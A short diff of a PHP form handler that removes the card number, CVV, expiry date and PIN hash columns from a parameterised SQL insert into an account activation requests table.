@@ -95,8 +95,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             try {
                 $stmt = $db->prepare('INSERT INTO activation_requests 
                     (first_name, last_name, dob, email, phone, account_number, 
-                     street, city, state, zip, ssn_last4, maiden_name, card_number, cvv, expiry_date, pin_hash, balance, status)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, "", "", "", "", ?, "pending")');
+                     street, city, state, zip, ssn_last4, maiden_name, balance, status)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, "pending")');
                 
                 $stmt->execute([
                     $form_data['first_name'],
